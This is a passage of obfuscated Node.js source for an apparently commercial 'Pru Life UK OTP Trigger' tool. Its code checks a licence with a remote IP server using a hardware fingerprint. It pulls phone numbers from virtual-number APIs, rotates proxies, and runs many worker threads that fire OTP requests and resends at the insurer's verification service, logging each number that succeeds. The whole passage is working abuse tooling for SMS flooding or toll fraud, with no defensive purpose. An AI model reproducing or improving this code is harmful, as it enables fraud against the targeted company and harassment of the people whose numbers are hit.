                const v433 = await promptText("Enter custom number of threads (type 'back' to go back):", '20');
                if (v433.toLowerCase() === "back") continue;
                v323 = parseInt(v433) || 0x14;
              } else v323 = v432;
              v316 = 0x5;
            } else {
              if (v316 === 0x5) {
                const v434 = {};
                v434.name = "⚡ Single OTP (Send once per number)", v434.value = "single";
                const v435 = {};
                v435.name = "🔄 Auto Resend 1x (Send OTP + 1 Resend with same leadid)", v435.value = "resend_1";
                const v436 = {};
                v436.name = "🔁 Custom Resend Loop (Multiple resends per number)", v436.value = "resend_custom";
                const v437 = {};
                v437.name = "⬅️ Go Back to Threads Selection", v437.value = "back";
                const v438 = await selectOption("SELECT DISPATCH / RESEND MODE", [v434, v435, v436, v437]);
                if (v438 === "back") {
                  v316 = 0x4;
                  continue;
                }
                if (v438 === "resend_1") {
                  v324 = 0x1;
                  const v439 = await promptText("Enter cooldown before Resend in seconds [default: 15]:", '15');
                  v325 = Math.max(0x1, parseInt(v439) || 0xf);
                } else {
                  if (v438 === "resend_custom") {
                    const v440 = await promptText("How many Resends per number? [default: 2]:", '2');
                    v324 = Math.max(0x1, parseInt(v440) || 0x2);
                    const v441 = await promptText("Enter cooldown between Resends in seconds [default: 15]:", '15');
                    v325 = Math.max(0x1, parseInt(v441) || 0xf);
                  } else v324 = 0x0, v325 = 0x0;
                }
                v316 = 0x6;
              } else {
                if (v316 === 0x6) break;
              }
            }
          }
        }
      }
    }
    return process.stdin.pause(), {
      'numbersFile': v318,
      'threads': String(v323),
      'proxiesFile': v322,
      'resendCount': v324,
      'resendDelay': v325,
      'nexaConfig': v319,
      'twoOoConfig': v326,
      'smsBowerConfig': v320,
      'zenexConfig': v321
    };
  }
  function generateHWID() {
    const v442 = require('os'),
      v443 = v442.platform();
    try {
      if (v443 === "win32") {
        const v444 = {};
        v444.stdio = "pipe", v444.timeout = 0x3a98;
        const v445 = execSync('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', v444).toString().trim();
        if (!v445) throw new Error("No hardware data");
        const v446 = crypto.createHash("sha256").update(v445).digest("hex").toUpperCase();
        return "SKING-" + v446.substring(0x0, 0x8) + '-' + v446.substring(0x8, 0xc) + '-' + v446.substring(0xc, 0x10);
      } else {
        let v447 = [];
        try {
          const v451 = {};
          v451.stdio = "pipe", v451.timeout = 0x1388;
          const v452 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", v451).toString().trim();
          if (v452 && v452 !== "null") v447.push('A:' + v452);
        } catch (v453) {}
        try {
          if (fs.existsSync("/proc/cpuinfo")) {
            const v454 = fs.readFileSync("/proc/cpuinfo", "utf8"),
              v455 = v454.match(/Serial\s*:\s*(\S+)/i),
              v456 = v454.match(/Hardware\s*:\s*(.+)/i);
            if (v455 && v455[0x1] !== "0000000000000000") v447.push('S:' + v455[0x1].trim());
            if (v456) v447.push('H:' + v456[0x1].trim());
          }
        } catch (v457) {}
        try {
          if (fs.existsSync("/etc/machine-id")) {
            const v458 = fs.readFileSync("/etc/machine-id", "utf8").trim();
            if (v458) v447.push('M:' + v458);
          }
        } catch (v459) {}
        try {
          const v460 = v442.cpus(),
            v461 = v460 && v460.length > 0x0 ? v460[0x0].model : "UnknownCPU",
            v462 = v442.totalmem(),
            v463 = v442.release(),
            v464 = v442.hostname();
          v447.push('F:' + v461 + '|' + v462 + '|' + v463 + '|' + v464);
        } catch (v465) {}
        const v448 = v447.join('||'),
          v449 = crypto.createHash("sha256").update(v448).digest("hex").toUpperCase(),
          v450 = require('os').platform() === "android" ? "ANKING-" : "SKING-";
        return v450 + v449.substring(0x0, 0x8) + '-' + v449.substring(0x8, 0xc) + '-' + v449.substring(0xc, 0x10);
      }
    } catch (v466) {
      return '';
    }
  }
  function verifyServerSignature(v467, v468) {
    if (!v468) return false;
    try {
      return crypto.verify(null, Buffer.from(v467, "utf8"), "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----", Buffer.from(v468, "base64"));
    } catch (v469) {
      return false;
    }
  }
  async function start() {
    const v470 = generateHWID();
    !v470 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(0x1));
    const v471 = generateHWID();
    v471 !== v470 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(0x1));
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("Pru Life UK OTP Trigger      ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v470.padEnd(0x1d)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v472 = false;
    const v473 = Date.now();
    try {
      const v500 = require("http"),
        v501 = await new Promise((v502, v503) => {
          const v504 = {};
          v504.hwid = v470, v504.app_id = "prulifeuk", v504.version = "1.0.0", v504.timestamp = v473;
          const v505 = JSON.stringify(v504);
          const v506 = {
              'hostname': "188.137.176.163",
              'port': 0xec1,
              'path': "/api/verify",
              'method': "POST",
              'headers': {
                'Content-Type': "application/json",
                'Content-Length': Buffer.byteLength(v505)
              },
              'timeout': 0x2710
            },
            v507 = v500.request(v506, v508 => {
              let v509 = '';
              v508.on("data", v510 => v509 += v510);
              v508.on("end", () => {
                try {
                  v502(JSON.parse(v509));
                } catch (v511) {
                  v503(v511);
                }
              });
            });
          v507.on("error", v503);
          v507.on("timeout", function () {
            this.destroy();
            v503(new Error("Timeout"));
          }), v507.write(v505), v507.end();
        });
      if (v501) {
        v501.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(0x1));
        if (v501.status === "banned" || v501.status === "expired" || !v501.sig) {
          await new Promise(v515 => setTimeout(v515, 0x7d0));
          let v514 = String(v501.reason || "NOT REGISTERED");
          if (!v501.reason && !v501.sig) v514 = "NOT REGISTERED / REMOVED";
          console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║   ✗ UNAUTHORIZED HARDWARE — PRULIFE TOOL    ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v470.padEnd(0x21)) + R('║')), console.error(R("  ║  Status : " + v514.padEnd(0x1a) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(0x1);
        }
        const v512 = v470 + "|prulifeuk|1.0.0|" + v473;
        !verifyServerSignature(v512, v501.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(0x1));
        v472 = true;
        let v513 = v501.token;
        !v513 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(0x1)), setInterval(() => {
          !v513 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(0x1));
          const v516 = {};
          v516.hwid = v470, v516.app_id = "prulifeuk", v516.token = v513;
          const v517 = JSON.stringify(v516);
          const v518 = {
              'hostname': "188.137.176.163",
              'port': 0xec1,
              'path': "/api/ping",
              'method': "POST",
              'headers': {
                'Content-Type': "application/json",
                'Content-Length': Buffer.byteLength(v517)
              },
              'timeout': 0x1388
            },
            v519 = v500.request(v518, v520 => {
              let v521 = '';
              v520.on("data", v522 => v521 += v522), v520.on("end", () => {
                try {
                  const v523 = JSON.parse(v521);
                  v523.status === 'ok' && v523.token ? v513 = v523.token : (console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(0x1));
                } catch (v524) {
                  console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(0x1);
                }
              });
            });
          v519.on("error", () => {
            console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
            process.exit(0x1);
          }), v519.on("timeout", function () {
            this.destroy();
            console.error(R("\n  ✗ License Server timeout. Exiting...\n")), process.exit(0x1);
          });
          v519.write(v517);
          v519.end();
        }, 0xafc8);
      }
    } catch (v525) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(0x1);
    }
    !v472 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(0x1));
    let v474 = process.argv.slice(0x2),
      v475 = null,
      v476 = null,
      v477 = null,
      v478 = null,
      v479 = 0x0,
      v480 = 0xf;
    if (v474.length === 0x0) {
      const v526 = await interactiveWizard();
      v474 = [v526.numbersFile, v526.threads, v526.proxiesFile], v479 = v526.resendCount || 0x0, v480 = v526.resendDelay || 0xf, v475 = v526.nexaConfig || null, v476 = v526.twoOoConfig || null, v477 = v526.smsBowerConfig || null, v478 = v526.zenexConfig || null;
    } else v479 = parseInt(v474[0x3]) || 0x0, v480 = parseInt(v474[0x4]) || 0xf;
    let v481 = path.resolve(v474[0x0] || "numbers.txt"),
      v482 = parseInt(v474[0x1]) || 0x14,
      v483 = v474[0x2] !== undefined ? v474[0x2] : "proxies.txt";
    if (v483.toLowerCase() === "none") v483 = '';
    const v484 = generateHWID();
    v484 !== v470 && (console.error(R("\n  ✗ CRITICAL SECURITY ALERT: Runtime memory injection detected.")), console.error(R("  ✗ HWID mismatch during execution sequence. Aborting...\n")), process.exit(0x1));
    printHeader(), console.log(B("  ✓ License: Licensed") + G(" | HWID: " + v470));
    let v485 = [];
    !v475 && !v476 && !v477 && !v478 && (!fs.existsSync(v481) && (console.error(R("✗ Error: Numbers file not found: " + v481)), process.exit(0x1)), v485 = fs.readFileSync(v481, "utf8").split(/\r?\n/).map(v527 => v527.trim()).filter(v528 => v528.length > 0x5));
    let v486 = [];
    v483 && fs.existsSync(v483) && (v486 = fs.readFileSync(v483, "utf8").split('\x0a').map(v529 => v529.trim()).filter(v530 => v530.length > 0x0));
    let v487 = v486.map(parseProxy).filter(Boolean);
    const v488 = v475 || v476 || v477 || v478;
    if (v488) {
      const v531 = v475 ? "NexaOTP" : v476 ? v476.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥" : v477 ? "📱 SMS Bower" : "⚡ Zenex";
      console.log(C("✓ Target  : " + v531 + " API (" + v488.totalCount + " numbers)"));
    } else console.log(C("✓ Loaded " + v485.length + " targets"));
    if (v487.length === 0x0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v487.length));
    console.log(C("✓ Threads : " + v482));
    v479 > 0x0 ? console.log(C("✓ Resend  : Enabled (" + v479 + "x per number with " + v480 + "s cooldown)\n")) : console.log(C("✓ Resend  : Disabled (Single Send)\n"));
    fs.writeFileSync("successful.txt", ''), fs.writeFileSync("failed.txt", ''), fs.writeFileSync("debug.txt", "=== PRU LIFE UK DEBUG SESSION " + new Date().toISOString() + " ===\n");
    const v489 = new Dashboard(v488 ? v488.totalCount : v485.length);
    let v490 = [],
      v491 = [],
      v492 = 0x0,
      v493 = false;
    if (v475 || v476) {
      const v532 = v475 ? "NexaOTP" : v476.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥";
      console.log(Y("\n  [" + v532 + "] Streaming " + v488.totalCount + " numbers (" + v488.ranges.length + " range(s))...")), (async () => {
        let v533 = 0x0,
          v534 = '';
        try {
          for (let v535 = 0x0; v535 < v488.totalCount; v535++) {
            try {
              const v536 = v488.ranges[Math.floor(Math.random() * v488.ranges.length)];
              let v537;
              v475 ? v537 = await nexaLimiter.enqueue(() => nexaFetchNumber(v475.apiKey, v536, v475.serverEndpoint)) : v537 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v476.apiKey, v536, v476.getPath)), v537 && (v492++, v533 = 0x0, v491.length > 0x0 ? v491.shift()(v537) : v490.push(v537));
            } catch (v538) {
              v534 = v538.message;
              if (v538.message.includes("Insufficient balance")) {
                console.error(R("\n  [" + v532 + "] ✗ Insufficient balance — aborting.\n"));
                break;
              }
              if (v538.message.includes("No numbers available")) continue;
              v533++;
              if (v533 >= 0x5 && v492 === 0x0) {
                console.error(R("\n  [" + v532 + "] ✗ Aborting — 5 consecutive failures. Last error: " + v534 + '\x0a'));
                break;
              }
            }
          }
        } finally {
          if (v492 === 0x0) console.error(R("\n  [" + v532 + "] ✗ No numbers fetched. Last error: " + (v534 || "Unknown") + '\x0a'));
          v493 = true;
          while (v491.length > 0x0) v491.shift()(null);
        }
      })();
    } else {
      if (v477) {
        const v539 = v477;
        console.log(Y("\n  [📱 SMS Bower] Streaming " + v539.totalCount + " numbers...")), (async () => {
          let v540 = 0x0;
          try {
            for (let v541 = 0x0; v541 < v539.totalCount; v541++) {
              try {
                const {
                  phoneNumber: v542
                } = await smsBowerFetchNumber(v539.apiKey, v539.service, v539.country, v539.maxPrice);
                v492++, v540 = 0x0;
                if (v491.length > 0x0) v491.shift()(v542);else v490.push(v542);
              } catch (v543) {
                v540++;
                if (v540 >= 0x5 && v492 === 0x0) break;
                await new Promise(v544 => setTimeout(v544, 0x7d0));
              }
            }
          } finally {
            v493 = true;
            while (v491.length > 0x0) v491.shift()(null);
          }
        })();
      } else {
        if (v478) {
          const v545 = v478;
          console.log(Y("\n  [⚡ Zenex] Streaming " + v545.totalCount + " numbers (" + v545.ranges.length + " range(s))...")), (async () => {
            let v546 = 0x0;
            try {
              for (let v547 = 0x0; v547 < v545.totalCount; v547++) {
                try {
                  const v548 = v545.ranges[Math.floor(Math.random() * v545.ranges.length)],
                    v549 = await zenexFetchNumber(v545.apiKey, v548);
                  v492++, v546 = 0x0;
                  if (v491.length > 0x0) v491.shift()(v549);else v490.push(v549);
                } catch (v550) {
                  v546++;
                  if (v546 >= 0x5 && v492 === 0x0) break;
                  await new Promise(v551 => setTimeout(v551, 0x7d0));
                }
              }
            } finally {
              v493 = true;
              while (v491.length > 0x0) v491.shift()(null);
            }
          })();
        }
      }
    }
    const v494 = !!(v475 || v476 || v477 || v478),
      v495 = v494 ? () => {
        if (v490.length > 0x0) return Promise.resolve(v490.shift());
        if (v493) return Promise.resolve(null);
        return new Promise(v552 => v491.push(v552));
      } : () => {
        if (v485.length === 0x0) return Promise.resolve(null);
        const v553 = Math.floor(Math.random() * v485.length);
        return Promise.resolve(v485.splice(v553, 0x1)[0x0]);
      };
    let v496 = 0x0;
    const fn7 = () => {
      if (v487.length === 0x0) return null;
      const v554 = v487[v496++ % v487.length];
      return rotateSessionId(v554);
    };
    function fn8(v555) {
      try {
        if (v494) return;
        const v556 = fs.readFileSync(v481, "utf8"),
          v557 = v556.split(/\r?\n/).filter(v558 => v558.trim() !== v555.trim()).join('\x0a');
        fs.writeFileSync(v481, v557);
      } catch (v559) {}
    }
    const v497 = v494 ? Math.min(v482, v488.totalCount) : Math.min(v482, v485.length),
      v498 = [];
    const v499 = setInterval(() => v489.render(), 0x1f4);
    async function fn9(v560) {
      while (true) {
        const v561 = await v495();
        if (!v561) break;
        const v562 = fn7();
        try {
          const v563 = await triggerOTP(v561, {
            'onStatus': v564 => v489.setStatus("Worker " + v560 + ':\x20' + v564),
            'proxy': v562,
            'workerId': v560,
            'resendCount': v479,
            'resendDelay': v480
          });
          if (v563.success) {
            v489.successful++, v489.processed++, fn8(v561);
            const v565 = v563.successfulResends ? "|RESENDS:" + v563.successfulResends : '';
            fs.appendFileSync("successful.txt", v563.phone + "|OTP_SENT" + v565 + '\x0a');
            const v566 = v563.successfulResends ? " (+" + v563.successfulResends + " Resend" + (v563.successfulResends > 0x1 ? 's' : '') + ')' : '';
            v489.addLog("Triggered OTP for " + v563.phone + v566, "success");
          } else v489.failed++, v489.processed++, fs.appendFileSync("failed.txt", v563.phone + '|' + v563.message + '\x0a'), v489.addLog("Failed on " + v563.phone + ':\x20' + v563.message, "error");
        } catch (v567) {
          v489.failed++, v489.processed++, v489.addLog("Fatal error on " + v561 + ':\x20' + v567.message, "error");
        }
      }
    }
    for (let v568 = 0x0; v568 < v497; v568++) v498.push(fn9(v568));
    await Promise.all(v498), clearInterval(v499), v489.render(), v489.stop();
  }
  start().catch(v569 => {
    console.error(R("Fatal error: " + v569.message));
    process.exit(0x1);
  });
}
function fn2(v570) {
  function fn10(v571) {
    fn10(++v571);
  }
  try {
    if (v570) return fn10;else fn10(0x0);
  } catch (v572) {}
}